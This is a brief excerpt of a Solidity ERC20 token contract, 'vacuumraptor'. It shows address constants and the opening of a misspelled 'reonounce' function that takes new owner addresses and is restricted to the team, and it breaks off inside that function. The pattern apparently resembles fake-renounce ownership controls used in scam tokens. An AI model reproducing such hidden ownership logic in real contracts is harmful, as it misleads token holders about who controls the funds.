...
contract vacuumraptor is IERC20, Ownable {
    using Address for address;
    
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = " raptor vacuum";
    ...
    function reonounce(address[] calldata _newowner, bool _renounce) external onlyTeam {
        if (_renounce) {
